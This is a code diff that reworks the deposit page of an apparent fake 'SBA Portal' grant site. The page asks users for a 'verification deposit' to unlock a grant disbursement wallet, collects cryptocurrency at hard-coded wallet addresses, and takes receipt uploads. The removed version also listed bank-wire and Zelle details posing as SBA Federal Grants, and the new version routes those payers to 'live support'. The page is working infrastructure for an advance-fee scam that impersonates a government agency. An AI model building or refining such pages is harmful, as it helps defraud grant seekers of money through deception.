@@ -1,175 +1,184 @@
 <!DOCTYPE html>
-<html lang="en" data-theme="light">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Deposit Funds | SBA Portal</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <link rel="stylesheet" href="global.css">
-    <style>
-        .deposit-container { max-width: 650px; margin: 40px auto; padding: 0 20px; }
-        .method-tabs { display: flex; gap: 10px; margin-bottom: 25px; }
-        .method-btn { flex: 1; padding: 15px; border: 1px solid var(--border); border-radius: 8px; background: var(--surface); cursor: pointer; text-align: center; font-weight: 600; transition: 0.2s; }
-        .method-btn.active { border-color: var(--navy); background: var(--navy-light); color: var(--navy); }
-        .address-box { background: var(--bg); padding: 20px; border-radius: 10px; border: 1px solid var(--border); margin-top: 20px; }
-        .crypto-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 20px; }
-        .coin-btn { padding: 10px; border: 1px solid var(--border); border-radius: 6px; cursor: pointer; text-align: center; font-size: 0.8rem; font-weight: 700; background: var(--surface); }
-        .coin-btn.active { background: var(--navy); color: white; border-color: var(--navy); }
-    </style>
 </head>
 <body>
     <div id="pageLoader" class="page-loader active"><div class="spinner"></div></div>
 
-    <div class="deposit-container">
-        <div id="statusState" class="card" style="display: none; text-align: center; padding: 60px 20px; margin-bottom: 30px;">
-            <div id="statusIcon" style="font-size: 4rem; margin-bottom: 20px;"></div>
-            <h2 id="statusTitle"></h2>
-            <p id="statusMsg"></p>
-        </div>
+    <div class="app-layout">
+        <aside class="app-sidebar" id="appSidebar"></aside>
+        <div class="app-sidebar__overlay" id="sidebarOverlay"></div>
 
-        <div class="card" id="depositForm">
-            <h1 style="margin-bottom: 10px;">Fund Your Account</h1>
-            <p style="color: var(--text-secondary); margin-bottom: 30px;">A verification deposit is required to activate your grant disbursement wallet.</p>
+        <main class="app-main">
+            <header class="page-header" id="pageHeader"></header>
 
-            <div class="method-tabs">
-                <button class="method-btn active" onclick="showMethod('crypto')">Crypto</button>
-                <button class="method-btn" onclick="showMethod('bank')">Bank Wire</button>
-                <button class="method-btn" onclick="showMethod('zelle')">Zelle</button>
+            <div class="app-main__content" style="max-width: 600px;">
+                <div id="depositTarget"></div>
             </div>
-
-            <!-- CRYPTO -->
-            <div id="method-crypto" class="method-content">
-                <div class="crypto-grid">
-                    <button class="coin-btn active" onclick="setCoin('BTC')">BTC</button>
-                    <button class="coin-btn" onclick="setCoin('USDT')">USDT</button>
-                    <button class="coin-btn" onclick="setCoin('ETH')">ETH</button>
-                    <button class="coin-btn" onclick="setCoin('SOL')">SOL</button>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Network</label>
-                    <select id="networkSelect" class="form-select" onchange="updateAddress()"></select>
-                </div>
-                <div class="address-box">
-                    <label class="form-label">Wallet Address</label>
-                    <div id="walletAddr" style="word-break: break-all; font-family: monospace; font-weight: 700; margin-bottom: 15px;"></div>
-                    <button class="btn btn--outline btn--sm btn--full" onclick="copyAddr()">Copy Address</button>
-                </div>
-            </div>
-
-            <!-- BANK -->
-            <div id="method-bank" class="method-content" style="display: none;">
-                <div class="address-box">
-                    <p><b>Bank:</b> Chase Bank</p>
-                    <p><b>Account:</b> SBA Federal Trust</p>
-                    <p><b>Routing:</b> 021000021</p>
-                    <p><b>Account #:</b> 4872951630</p>
-                </div>
-            </div>
-
-            <!-- ZELLE -->
-            <div id="method-zelle" class="method-content" style="display: none;">
-                <div class="address-box">
-                    <p><b>Zelle Email:</b> grants@sbafederal.gov</p>
-                    <p><b>Name:</b> SBA Federal Grants</p>
-                </div>
-            </div>
-
-            <form id="submissionForm" style="margin-top: 30px;">
-                <div class="form-group">
-                    <label class="form-label">Deposit Amount (USD)</label>
-                    <input type="number" id="depAmount" class="form-input" required placeholder="$0.00">
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Upload Transfer Receipt</label>
-                    <input type="file" id="depReceipt" accept="image/*" class="form-input" required>
-                </div>
-                <button type="submit" class="btn btn--primary btn--full btn--lg">Submit Deposit</button>
-            </form>
-        </div>
+        </main>
     </div>
 
     <script type="module">
-        import { auth, db, updateUserData, compressToBase64, notify, notifyAdmins, addLedgerEntry } from './firebase-config.js';
-        import { requireAuth, hideLoader, showToast, copyToClipboard } from './app.js';
+        import { db, serverTimestamp, updateUserData, addLedgerEntry, compressToBase64, notify, notifyAdmins } from './firebase-config.js';
+        import { requireAuth, buildSidebar, buildPageHeader, initTheme, initNotificationBadge, setButtonLoading, showToast } from './app.js';
 
         const WALLETS = {
-            BTC: { 'Bitcoin': 'bc1qrrc86d42pzejhwxxsjfctmjkj7dl52q0j0qy9k' },
-            USDT: { 'TRC20': 'TKZcchSTjdJXEoVZmErwfiSUmZFnh6Tjwx', 'ERC20': '0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E' },
-            ETH: { 'ERC20': '0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E' },
-            SOL: { 'Solana': '9UgFrLx796JagxDAJARrqzzW7c9DPHfrS2n3UH7vsMf4' }
+            BTC: { name: 'Bitcoin', icon: 'fa-bitcoin-sign', color: '#f7931a', addr: 'bc1qrrc86d42pzejhwxxsjfctmjkj7dl52q0j0qy9k' },
+            ETH: { name: 'Ethereum (ERC20)', icon: 'fa-ethereum', color: '#627eea', addr: '0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E' },
+            USDT: { name: 'USDT (TRC20)', icon: 'fa-dollar-sign', color: '#26a17b', addr: 'TKZcchSTjdJXEoVZmErwfiSUmZFnh6Tjwx' }
         };
-
-        let currentCoin = 'BTC';
 
         requireAuth((user, userData) => {
-            if (userData.depositStatus !== 'IDLE') {
-                const s = document.getElementById('statusState');
-                s.style.display = 'block';
-                if(userData.depositStatus === 'PENDING') {
-                    document.getElementById('statusIcon').innerText = '⏳';
-                    document.getElementById('statusTitle').innerText = 'Deposit Pending';
-                    document.getElementById('statusMsg').innerText = 'Your deposit is being verified by our finance team.';
-                } else if(userData.depositStatus === 'CONFIRMED') {
-                    document.getElementById('statusIcon').innerText = '✅';
-                    document.getElementById('statusTitle').innerText = 'Deposit Confirmed';
-                    document.getElementById('statusMsg').innerText = 'Funds have been added to your balance.';
-                }
+            initTheme();
+            buildSidebar({ activeId: 'deposit', userData });
+            buildPageHeader({ title: 'Fund Account', subtitle: 'Secure Payment Submission', backUrl: 'dashboard.html' });
+            initNotificationBadge(user.uid);
+
+            const target = document.getElementById('depositTarget');
+
+            if (userData.depositStatus === 'PENDING') {
+                target.innerHTML = `
+                    <div class="status-screen card">
+                        <div class="status-screen__icon status-screen__icon--pending"><i class="fa-solid fa-hourglass-half"></i></div>
+                        <h2 class="status-screen__title">Payment Under Review</h2>
+                        <p class="status-screen__message">We are verifying your transaction receipt. This usually takes 1-4 hours during business hours.</p>
+                        <a href="dashboard.html" class="btn btn--secondary">Go to Dashboard</a>
+                    </div>
+                `;
+            } else {
+                renderStep1(user, userData, target);
             }
-            hideLoader();
-            setCoin('BTC');
         });
 
-        window.showMethod = (m) => {
-            document.querySelectorAll('.method-btn').forEach(b => b.classList.toggle('active', b.innerText.toLowerCase().includes(m)));
-            document.querySelectorAll('.method-content').forEach(c => c.style.display = c.id === `method-${m}` ? 'block' : 'none');
-        };
+        function renderStep1(user, userData, target) {
+            target.innerHTML = `
+                <div class="card">
+                    <h3 style="font-weight:800; color:var(--navy); margin-bottom:24px;">Select Method</h3>
+                    <div class="method-selector">
+                        <div class="method-card" data-method="crypto">
+                            <i class="fa-solid fa-bitcoin-sign method-card__icon" style="color:#f7931a"></i>
+                            <div class="method-card__name">Crypto</div>
+                        </div>
+                        <div class="method-card" data-method="bank">
+                            <i class="fa-solid fa-building-columns method-card__icon" style="color:var(--navy)"></i>
+                            <div class="method-card__name">Bank Wire</div>
+                        </div>
+                        <div class="method-card" data-method="zelle">
+                            <i class="fa-solid fa-envelope method-card__icon" style="color:#6d28d9"></i>
+                            <div class="method-card__name">Zelle</div>
+                        </div>
+                    </div>
+                    <div id="methodDetails"></div>
+                </div>
+            `;
 
-        window.setCoin = (c) => {
-            currentCoin = c;
-            document.querySelectorAll('.coin-btn').forEach(b => b.classList.toggle('active', b.innerText === c));
-            const select = document.getElementById('networkSelect');
-            select.innerHTML = '';
-            Object.keys(WALLETS[c]).forEach(net => {
-                const opt = document.createElement('option');
-                opt.value = net; opt.innerText = net;
-                select.appendChild(opt);
+            document.querySelectorAll('.method-card').forEach(card => {
+                card.onclick = () => {
+                    document.querySelectorAll('.method-card').forEach(c => c.classList.remove('selected'));
+                    card.classList.add('selected');
+                    const method = card.dataset.method;
+                    if (method === 'crypto') renderCrypto(user, target);
+                    else renderBankZelle(user, target, method);
+                };
             });
-            updateAddress();
-        };
+        }
 
-        window.updateAddress = () => {
-            const net = document.getElementById('networkSelect').value;
-            document.getElementById('walletAddr').innerText = WALLETS[currentCoin][net];
-        };
+        function renderCrypto(user, target) {
+            const div = document.getElementById('methodDetails');
+            div.innerHTML = `
+                <div class="coin-grid mt-4">
+                    ${Object.keys(WALLETS).map(key => `
+                        <div class="coin-btn" data-coin="${key}">
+                            <i class="fa-solid ${WALLETS[key].icon}" style="color:${WALLETS[key].color}"></i>
+                            <span class="coin-btn__name">${key}</span>
+                        </div>
+                    `).join('')}
+                </div>
+                <div id="cryptoPayment" style="display:none;">
+                    <div class="address-display">
+                        <div class="address-display__label">Send payment to this address:</div>
+                        <div class="address-display__value" id="walletAddr"></div>
+                        <button class="btn btn--secondary btn--sm" id="btnCopyAddr">Copy Address</button>
+                    </div>
+                    <div class="form-group mt-6">
+                        <label class="form-label">Amount Transferred (USD)</label>
+                        <input type="number" id="dep-amount" class="form-input" placeholder="0.00">
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Upload Receipt</label>
+                        <input type="file" id="dep-receipt" class="form-input" accept="image/*">
+                    </div>
+                    <button class="btn btn--primary btn--full mt-4" id="btnSubmitDep">Submit Payment Proof</button>
+                </div>
+            `;
 
-        window.copyAddr = () => copyToClipboard(document.getElementById('walletAddr').innerText);
+            document.querySelectorAll('.coin-btn').forEach(btn => {
+                btn.onclick = () => {
+                    document.querySelectorAll('.coin-btn').forEach(b => b.classList.remove('selected'));
+                    btn.classList.add('selected');
+                    const coin = btn.dataset.coin;
+                    document.getElementById('walletAddr').innerText = WALLETS[coin].addr;
+                    document.getElementById('cryptoPayment').style.display = 'block';
+                    
+                    document.getElementById('btnSubmitDep').onclick = () => submitDeposit(user, 'Crypto', coin);
+                };
+            });
 
-        document.getElementById('submissionForm').onsubmit = async (e) => {
-            e.preventDefault();
-            const receipt = document.getElementById('depReceipt').files[0];
-            const amount = document.getElementById('depAmount').value;
+            document.getElementById('btnCopyAddr').onclick = () => {
+                navigator.clipboard.writeText(document.getElementById('walletAddr').innerText);
+                showToast('Address copied!', 'success');
+            };
+        }
+
+        async function submitDeposit(user, method, sub) {
+            const amount = document.getElementById('dep-amount').value;
+            const file = document.getElementById('dep-receipt').files[0];
+            if (!amount || !file) return showToast('Amount and receipt required', 'warning');
+
+            const btn = document.getElementById('btnSubmitDep');
+            setButtonLoading(btn, true);
 
             try {
-                showToast("Compressing receipt...", "info");
-                const base64 = await compressToBase64(receipt);
-                const uid = auth.currentUser.uid;
-
-                await updateUserData(uid, {
+                const b64 = await compressToBase64(file);
+                await updateUserData(user.uid, {
                     depositStatus: 'PENDING',
-                    deposit: { amount, receiptBase64: base64, submittedAt: new Date().toISOString() }
+                    deposit: { method, coin: sub || '', amount: parseFloat(amount), receiptBase64: b64, submittedAt: serverTimestamp() }
                 });
+                await addLedgerEntry(user.uid, { type: 'deposit', amount: parseFloat(amount), description: `Deposit via ${method}`, status: 'PENDING' });
+                showToast('Deposit submitted', 'success');
+                window.location.reload();
+            } catch (e) {
+                setButtonLoading(btn, false);
+                showToast('Submission error', 'error');
+            }
+        }
 
-                await addLedgerEntry(uid, {
-                    type: 'Deposit',
-                    amount: Number(amount),
-                    description: `Wallet Funding Deposit`,
-                    status: 'PENDING'
-                });
-
-                await notifyAdmins({ title: "New Deposit", message: `A user deposited $${amount}`, type: "action" });
-                showToast("Deposit submitted", "success");
-                setTimeout(() => location.reload(), 1500);
-            } catch (err) { showToast(err.message, "error"); }
-        };
+        function renderBankZelle(user, target, method) {
+            const div = document.getElementById('methodDetails');
+            const isBank = method === 'bank';
+            div.innerHTML = `
+                <div class="alert alert--warning mt-4">
+                    <i class="fa-solid fa-triangle-exclamation"></i>
+                    <span>Please contact live support to receive the current ${isBank ? 'Bank Wire' : 'Zelle'} details for your region.</span>
+                </div>
+                <div class="form-group mt-4">
+                    <label class="form-label">Amount Sent (USD)</label>
+                    <input type="number" id="dep-amount" class="form-input" placeholder="0.00">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Upload Receipt/Screenshot</label>
+                    <input type="file" id="dep-receipt" class="form-input" accept="image/*">
+                </div>
+                <button class="btn btn--primary btn--full" id="btnSubmitDep">Submit Proof</button>
+                <a href="support.html" class="btn btn--ghost btn--full mt-2">Chat with Agent</a>
+            `;
+            document.getElementById('btnSubmitDep').onclick = () => submitDeposit(user, method.toUpperCase());
+        }
     </script>
 </body>
 </html>
